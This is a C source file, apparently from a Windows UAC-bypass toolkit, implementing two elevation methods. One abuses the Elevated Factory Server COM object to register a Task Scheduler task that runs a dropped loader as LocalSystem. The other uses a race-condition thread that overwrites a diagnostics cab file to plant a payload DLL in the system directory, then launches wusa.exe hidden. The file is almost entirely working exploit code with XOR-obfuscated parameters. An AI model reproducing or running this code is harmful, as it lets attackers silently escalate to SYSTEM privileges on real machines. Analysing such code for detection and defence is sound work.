/*******************************************************************************
*
*  (C) COPYRIGHT AUTHORS, 2020 - 2024
*
*  TITLE:       ZCGONVH.C
*
*  VERSION:     3.66
*
*  DATE:        03 Apr 2024
*
*  UAC bypass methods based on zcgonvh original work.
*
* THIS CODE AND INFORMATION IS PROVIDED "AS IS" WITHOUT WARRANTY OF
* ANY KIND, EITHER EXPRESSED OR IMPLIED, INCLUDING BUT NOT LIMITED
* TO THE IMPLIED WARRANTIES OF MERCHANTABILITY AND/OR FITNESS FOR A
* PARTICULAR PURPOSE.
*
*******************************************************************************/

#include "global.h"
#include "encresource.h"

HRESULT ucmxGetElevatedFactoryServerObject(
    _In_ LPCWSTR Clsid,
    _Out_ VOID** FactoryServer
)
{
    HRESULT r;
    IElevatedFactoryServer* pElevatedServer = NULL;

    *FactoryServer = NULL;

    r = ucmAllocateElevatedObject(Clsid,
        &IID_ElevatedFactoryServer,
        CLSCTX_LOCAL_SERVER,
        (VOID**)&pElevatedServer);

    if (FAILED(r))
        return r;

    if (pElevatedServer == NULL) {
        return E_OUTOFMEMORY;
    }

    *FactoryServer = pElevatedServer;
    return S_OK;
}

BOOL ucmxGetElevatedFactoryServerAndTaskService(
    _Out_ IElevatedFactoryServer** FactoryServer,
    _Out_ ITaskService** TaskService
)
{
    IElevatedFactoryServer* pElevatedServer = NULL;
    ITaskService* pService = NULL;
    HRESULT r;

    *TaskService = NULL;
    *FactoryServer = NULL;

    do {
        r = ucmxGetElevatedFactoryServerObject(T_CLSID_VFServer,
            (VOID**)&pElevatedServer);

        if (r != S_OK)
            break;

        r = pElevatedServer->lpVtbl->ServerCreateElevatedObject(pElevatedServer,
            &CLSID_TaskScheduler,
            &IID_ITaskService,
            (void**)&pService);

        if (r != S_OK)
            break;

        if (pService == NULL) {
            r = E_OUTOFMEMORY;
            break;
        }

        *FactoryServer = pElevatedServer;
        *TaskService = pService;

    } while (FALSE);

    return SUCCEEDED(r);
}

BOOL ucmxRegisterAndRunTask(
    _In_ ITaskService* TaskService,
    _In_ BSTR RegistrationData
)
{
    HRESULT r = E_FAIL;
    VARIANT varDummy;

    ITaskFolder* pTaskFolder = NULL;
    IRegisteredTask* pTask = NULL;
    IRunningTask* pRunningTask = NULL;

    TASK_STATE taskState = TASK_STATE_UNKNOWN;

    BSTR bstrTaskFolder = NULL, bstrTaskName = NULL;

    do {

        bstrTaskFolder = SysAllocString(L"\\");
        if (bstrTaskFolder == NULL)
            break;

        bstrTaskName = SysAllocString(THEOLDNEWTHING);
        if (bstrTaskName == NULL)
            break;

        VariantInit(&varDummy);

        r = TaskService->lpVtbl->Connect(TaskService,
            varDummy,
            varDummy,
            varDummy,
            varDummy);

        if (FAILED(r))
            break;

        r = TaskService->lpVtbl->GetFolder(TaskService, bstrTaskFolder, &pTaskFolder);
        if (r != S_OK || pTaskFolder == NULL)
            break;

        r = pTaskFolder->lpVtbl->RegisterTask(pTaskFolder, bstrTaskName, RegistrationData, 0,
            varDummy, varDummy, TASK_LOGON_INTERACTIVE_TOKEN, varDummy, &pTask);

        if (r == HRESULT_FROM_WIN32(ERROR_ALREADY_EXISTS)) {

            r = pTaskFolder->lpVtbl->GetTask(pTaskFolder, bstrTaskName, &pTask);
            if (SUCCEEDED(r)) {

                pTask->lpVtbl->Stop(pTask, 0);
                pTask->lpVtbl->Release(pTask);

                pTaskFolder->lpVtbl->DeleteTask(pTaskFolder, bstrTaskName, 0);
            }

            r = pTaskFolder->lpVtbl->RegisterTask(pTaskFolder, bstrTaskName, RegistrationData, 0,
                varDummy, varDummy, TASK_LOGON_INTERACTIVE_TOKEN, varDummy, &pTask);
        }

        if (r != S_OK || pTask == NULL)
            break;

        r = pTask->lpVtbl->Run(pTask, varDummy, &pRunningTask);

        if (r != S_OK || pRunningTask == NULL)
            break;

        if (SUCCEEDED(pRunningTask->lpVtbl->get_State(pRunningTask, &taskState))) {

            if (taskState == TASK_STATE_RUNNING) {
                Sleep(5000);
            }

        }
        pRunningTask->lpVtbl->Stop(pRunningTask);
        pTaskFolder->lpVtbl->DeleteTask(pTaskFolder, bstrTaskName, 0);

    } while (FALSE);

    if (bstrTaskFolder)
        SysFreeString(bstrTaskFolder);

    if (bstrTaskName)
        SysFreeString(bstrTaskName);

    if (pRunningTask)
        pRunningTask->lpVtbl->Release(pRunningTask);

    if (pTask)
        pTask->lpVtbl->Release(pTask);

    if (pTaskFolder)
        pTaskFolder->lpVtbl->Release(pTaskFolder);

    return SUCCEEDED(r);
}

BSTR ucmxBuildParametersForTask(
    _In_ LPCWSTR lpLoader,
    _In_ SIZE_T cbLoader
)
{
    BSTR bstrResult = NULL;
    SIZE_T sz;
    PVOID workBuffer, offsetPtr;

    sz = cbLoader +
        sizeof(g_encodedTaskParamBegin) +
        sizeof(g_encodedTaskParamEnd);

    workBuffer = (PWCH)supHeapAlloc(sz);
    if (workBuffer) {

        offsetPtr = workBuffer;
        RtlCopyMemory(offsetPtr, g_encodedTaskParamBegin, sizeof(g_encodedTaskParamBegin));
        EncodeBuffer(offsetPtr, sizeof(g_encodedTaskParamBegin), AKAGI_XOR_KEY2);
        offsetPtr = RtlOffsetToPointer(offsetPtr, sizeof(g_encodedTaskParamBegin));

        RtlCopyMemory(offsetPtr, lpLoader, cbLoader);
        offsetPtr = RtlOffsetToPointer(offsetPtr, cbLoader);

        RtlCopyMemory(offsetPtr, g_encodedTaskParamEnd, sizeof(g_encodedTaskParamEnd));
        EncodeBuffer(offsetPtr, sizeof(g_encodedTaskParamEnd), AKAGI_XOR_KEY2);

        bstrResult = SysAllocString(workBuffer);

        supHeapFree(workBuffer);
    }

    return bstrResult;
}

/*
* ucmVFServerTaskSchedMethod
*
* Purpose:
*
* Bypass UAC by using Elevated Factory Server COM object.
*
* 1. Allocate Elevated Factory Server COM object and produce with it help Task Scheduler object.
* 2. Use Task Scheduler object to register task running as LocalSystem.
*
*/
NTSTATUS ucmVFServerTaskSchedMethod(
    _In_ PVOID ProxyDll,
    _In_ DWORD ProxyDllSize
)
{
    BOOL bNeedCleanup = FALSE;
    NTSTATUS MethodResult = STATUS_ACCESS_DENIED;
    HRESULT hr_init;
    IElevatedFactoryServer* pElevatedServer = NULL;
    ITaskService* pTaskService = NULL;
    BSTR bstrXml = NULL;
    WCHAR szLoaderFileName[MAX_PATH * 2];

    ucmConsolePrint(TEXT("[+] Entering ucmVFServerTaskSchedMethod\r\n"));

    hr_init = CoInitializeEx(NULL, COINIT_APARTMENTTHREADED);

    do {

        //
        // Write loader to the %temp%
        //
        if (!supReplaceDllEntryPoint(
            ProxyDll,
            ProxyDllSize,
            AKATSUKI_ENTRYPOINT_EXE,
            TRUE))
        {
            break;
        }
        RtlSecureZeroMemory(&szLoaderFileName, sizeof(szLoaderFileName));
        _strcpy(szLoaderFileName, g_ctx->szTempDirectory);
        _strcat(szLoaderFileName, THEOLDNEWTHING);
        _strcat(szLoaderFileName, TEXT(".exe"));

        bNeedCleanup = supWriteBufferToFile(szLoaderFileName, ProxyDll, ProxyDllSize);
        if (!bNeedCleanup)
            break;

        bstrXml = ucmxBuildParametersForTask(szLoaderFileName, _strlen(szLoaderFileName) * sizeof(WCHAR));
        if (bstrXml == NULL)
            break;

        if (!ucmxGetElevatedFactoryServerAndTaskService(&pElevatedServer, &pTaskService))
            break;

        if (ucmxRegisterAndRunTask(pTaskService, bstrXml))
            MethodResult = STATUS_SUCCESS;

    } while (FALSE);

    if (bstrXml)
        SysFreeString(bstrXml);

    if (pElevatedServer != NULL) {
        pElevatedServer->lpVtbl->Release(pElevatedServer);
    }

    if (pTaskService) {
        pTaskService->lpVtbl->Release(pTaskService);
    }

    if (SUCCEEDED(hr_init))
        CoUninitialize();

    if (bNeedCleanup)
        DeleteFile(szLoaderFileName);

    return MethodResult;
}

typedef struct _UCMX_OVP {
    PVOID ProxyDll;
    DWORD ProxyDllSize;
    WCHAR TargetFile[MAX_PATH * 2]; //%temp%\hui32\results.cab
} UCMX_OVP, * PUCMX_OVP;

HANDLE OverwriteThreadHandle = NULL;
LONG TerminateOverwriteThread = FALSE;

/*
* ucmxOverwriteThread
*
* Purpose:
*
* Thread for race condition, continuously overwrite diagprofile results.cab file with the payload.
*
*/
DWORD ucmxOverwriteThread(
    _In_ PVOID Parameter)
{
    UCMX_OVP params;
    HANDLE hTargetFile;
    DWORD bytesIO;

    RtlCopyMemory(&params, Parameter, sizeof(UCMX_OVP));

    while (TRUE) {

        if (TerminateOverwriteThread) {
            break;
        }

        hTargetFile = CreateFile(params.TargetFile,
            GENERIC_WRITE,
            FILE_SHARE_VALID_FLAGS,
            NULL,
            OPEN_EXISTING,
            FILE_ATTRIBUTE_NORMAL,
            NULL);

        if (hTargetFile != INVALID_HANDLE_VALUE) {

            WriteFile(hTargetFile, params.ProxyDll, params.ProxyDllSize, &bytesIO, NULL);
            CloseHandle(hTargetFile);

        }

    }

    supHeapFree(Parameter);
    CloseHandle(OverwriteThreadHandle);
    OverwriteThreadHandle = NULL;
    return 0;
}

/*
* ucmxTriggerDiagProfile
*
* Purpose:
*
* Allocate elevated diag profile object and call SaveDirectoryAsCab method.
*
*/
HRESULT ucmxTriggerDiagProfile(
    _In_ LPCWSTR lpDirectory
)
{
    HRESULT r = E_FAIL;

    IElevatedFactoryServer* pElevatedServer = NULL;
    IUnknown* pUnknown = NULL;
    IDispatch* pDispatch = NULL;

    CLSID clsid;

    DISPID dispid;
    DISPPARAMS dispatchParams;
    LPOLESTR methodName = NULL;

    VARIANT result;
    VARIANTARG values[2];
    WCHAR szTarget[MAX_PATH * 2];

    do {
        methodName = SysAllocString(L"SaveDirectoryAsCab");
        if (methodName == NULL)
            break;

        r = ucmxGetElevatedFactoryServerObject(
            T_CLSID_VFServerDiagCpl,
            (VOID**)&pElevatedServer);

        if (r != S_OK)
            break;

        ucmConsolePrint(TEXT("[+] Elevated Factory Server object allocated\r\n"));

        r = CLSIDFromString(T_CLSID_DiagnosticProfile, &clsid);
        if (r != S_OK)
            break;

        r = pElevatedServer->lpVtbl->ServerCreateElevatedObject(pElevatedServer,
            &clsid,
            &IID_IUnknown,
            (void**)&pUnknown);

        if (r != S_OK)
            break;

        ucmConsolePrint(TEXT("[+] Elevated DiagProfile object allocated\r\n"));

        if (pUnknown == NULL) {
            r = E_OUTOFMEMORY;
            break;
        }

        r = pUnknown->lpVtbl->QueryInterface(pUnknown, &IID_IDispatch, (VOID**)&pDispatch);

        if (r != S_OK)
            break;

        ucmConsolePrint(TEXT("[+] QueryInterface success\r\n"));

        if (pDispatch == NULL) {
            r = E_OUTOFMEMORY;
            break;
        }

        r = pDispatch->lpVtbl->GetIDsOfNames(pDispatch, &IID_NULL, &methodName, 1, LOCALE_USER_DEFAULT, &dispid);
        if (r != S_OK)
            break;

        ucmConsolePrint(TEXT("[+] Dispatch->GetIDsOfNames success\r\n"));

        RtlSecureZeroMemory(&dispatchParams, sizeof(dispatchParams));

        VariantInit(&values[0]);

        _strcpy(szTarget, g_ctx->szSystemDirectory);
        _strcat(szTarget, WOW64LOG_DLL);

        values[0].vt = VT_BSTR;
        values[0].bstrVal = SysAllocString(szTarget);

        VariantInit(&values[1]);
        values[1].vt = VT_BSTR;
        values[1].bstrVal = SysAllocString(lpDirectory);

        dispatchParams.cArgs = 2;
        dispatchParams.rgvarg = values;

        VariantInit(&result);

        r = pDispatch->lpVtbl->Invoke(pDispatch,
            dispid,
            &IID_NULL,
            LOCALE_USER_DEFAULT,
            DISPATCH_METHOD,
            &dispatchParams,
            &result,
            NULL,
            NULL);

        ucmConsolePrintValueUlong(TEXT("[+] Dispatch->Invoke"), r, TRUE);

        if (values[0].bstrVal) SysFreeString(values[0].bstrVal);
        if (values[1].bstrVal) SysFreeString(values[1].bstrVal);

    } while (FALSE);

    if (methodName)
        SysFreeString((BSTR)methodName);

    if (pDispatch) {
        pDispatch->lpVtbl->Release(pDispatch);
    }

    if (pUnknown) {
        pUnknown->lpVtbl->Release(pUnknown);
    }

    if (pElevatedServer != NULL) {
        pElevatedServer->lpVtbl->Release(pElevatedServer);
    }

    return r;
}

/*
* ucmVFServerDiagProfileMethod
*
* Purpose:
*
* Bypass UAC by using Elevated Factory Server COM object.
*
* 1. Allocate Elevated Factory Server COM object and produce with it help Diag Profiler object.
* 2. Use Diag Profiler object to move files into protected area via race condition.
*
*/
NTSTATUS ucmVFServerDiagProfileMethod(
    _In_ PVOID ProxyDll,
    _In_ DWORD ProxyDllSize
)
{
    NTSTATUS MethodResult = STATUS_ACCESS_DENIED;
    HRESULT hr_init, r;
    DWORD dwLastError;
    ULONG retryCount = 0;

    UCMX_OVP* ovParams = NULL;

    WCHAR szBuffer[MAX_PATH * 2];

    ucmConsolePrint(TEXT("[+] Entering ucmVFServerDiagProfileMethod\r\n"));

    hr_init = CoInitializeEx(NULL, COINIT_APARTMENTTHREADED);

    do {

        //
        // Create %temp%\hui32 directory.
        //
        _strcpy(szBuffer, g_ctx->szTempDirectory);
        _strcat(szBuffer, THEOLDNEWTHING);
        if (!CreateDirectory((LPCWSTR)&szBuffer, NULL)) {
            dwLastError = GetLastError();
            if (dwLastError != ERROR_ALREADY_EXISTS) {
                ucmConsolePrintValueUlong(TEXT("[!] Could not create directory\r\n"), dwLastError, TRUE);
                break;
            }
        }

        ovParams = (UCMX_OVP*)supHeapAlloc(sizeof(UCMX_OVP));
        if (ovParams == NULL)
            break;

        ovParams->ProxyDll = ProxyDll;
        ovParams->ProxyDllSize = ProxyDllSize;

        _strcpy(ovParams->TargetFile, szBuffer);
        supPathAddBackSlash(ovParams->TargetFile);
        _strcat(ovParams->TargetFile, TEXT("results.cab"));

        OverwriteThreadHandle = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)ucmxOverwriteThread, (PVOID)ovParams, 0, NULL);
        if (OverwriteThreadHandle == NULL) {
            ucmConsolePrintValueUlong(TEXT("[!] Cannot create worker thread\r\n"), GetLastError(), TRUE);
            supHeapFree(ovParams);
            break;
        }

        SetThreadPriority(OverwriteThreadHandle, THREAD_PRIORITY_TIME_CRITICAL);

        r = ucmxTriggerDiagProfile(szBuffer);
        if (FAILED(r)) {
            ucmConsolePrintValueUlong(TEXT("[!] DiagProfile does not trigger\r\n"), r, TRUE);
            break;
        }

        _InterlockedExchange((LONG*)&TerminateOverwriteThread, TRUE);

        _strcpy(szBuffer, g_ctx->szSystemDirectory);
        _strcat(szBuffer, WOW64LOG_DLL);

        do {

            if (PathFileExists(szBuffer)) {
                ucmConsolePrint(TEXT("[+] Payload file installed\r\n"));
                break;
            }
            else
                Sleep(1000);

        } while (++retryCount < 10);

        _strcpy(szBuffer, USER_SHARED_DATA->NtSystemRoot);
        _strcat(szBuffer, SYSWOW64_DIR);
        _strcat(szBuffer, WUSA_EXE);

        if (supRunProcess2(szBuffer,
            NULL,
            NULL,
            SW_HIDE,
            5000))
        {
            ucmConsolePrint(TEXT("[+] Target executed\r\n"));
            MethodResult = STATUS_SUCCESS;
        }

    } while (FALSE);

    if (OverwriteThreadHandle) {
        TerminateThread(OverwriteThreadHandle, 0);
        CloseHandle(OverwriteThreadHandle);
        OverwriteThreadHandle = NULL;
    }

    //
    // Cleanup.
    //

    if (SUCCEEDED(hr_init))
        CoUninitialize();

    return MethodResult;
}
